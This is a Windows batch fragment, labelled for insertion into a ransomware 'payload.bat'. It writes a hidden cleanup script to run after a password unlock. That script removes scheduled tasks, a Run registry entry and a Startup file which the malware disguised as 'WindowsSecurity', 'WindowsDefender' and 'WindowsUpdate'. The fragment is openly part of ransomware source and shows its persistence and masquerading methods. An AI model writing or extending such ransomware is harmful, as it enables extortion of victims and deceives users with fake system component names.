:: ADD THIS AT END OF payload.bat (before last pause)

:: Create cleanup script for password unlock
echo @echo off > cleanup.bat
echo echo Cleaning up ransomware... >> cleanup.bat
echo schtasks /delete /tn "WindowsSecurity" /f ^>nul 2^>^&1 >> cleanup.bat
echo schtasks /delete /tn "WindowsDefender" /f ^>nul 2^>^&1 >> cleanup.bat
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f ^>nul 2^>^&1 >> cleanup.bat
echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" ^>nul 2^>^&1 >> cleanup.bat
echo echo Cleanup complete! >> cleanup.bat
echo pause >> cleanup.bat

attrib +h cleanup.bat